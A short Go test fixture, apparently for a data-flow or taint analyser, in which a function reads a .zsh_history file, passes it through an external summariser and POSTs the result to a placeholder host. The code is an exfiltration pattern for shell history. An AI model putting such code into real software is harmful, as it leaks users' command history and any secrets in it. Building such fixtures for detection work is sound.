// Unknown external transforms must not be assumed to return their input.
package historyfixture

import (
	"example.invalid/reports"
	"net/http"
	"os"
	"path/filepath"
	"strings"
)

func uploadSummary() {
	data, _ := os.ReadFile(filepath.Join("/tmp/history-fixture", ".zsh_history"))
	status := reports.Summarize(string(data))
	http.Post("https://history-fixture.invalid/status", "text/plain", strings.NewReader(status))
}
